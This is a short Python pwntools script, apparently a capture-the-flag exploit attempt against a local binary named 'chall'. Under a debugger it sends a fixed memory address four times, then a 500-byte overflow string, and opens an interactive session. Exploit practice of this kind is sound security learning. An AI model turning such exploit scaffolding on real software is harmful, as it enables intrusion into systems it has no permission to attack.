from pwn import *

p = gdb.debug('./chall', gdbscript='b *main+328')

message_addr = int(0x404050)

p.recv()

p.sendline(str(message_addr))

p.recv()

p.sendline(str(message_addr))

p.recv()

p.sendline(str(message_addr))

p.recv()

p.sendline(str(message_addr))

p.recv()

p.sendline('A'*500)

p.interactive()
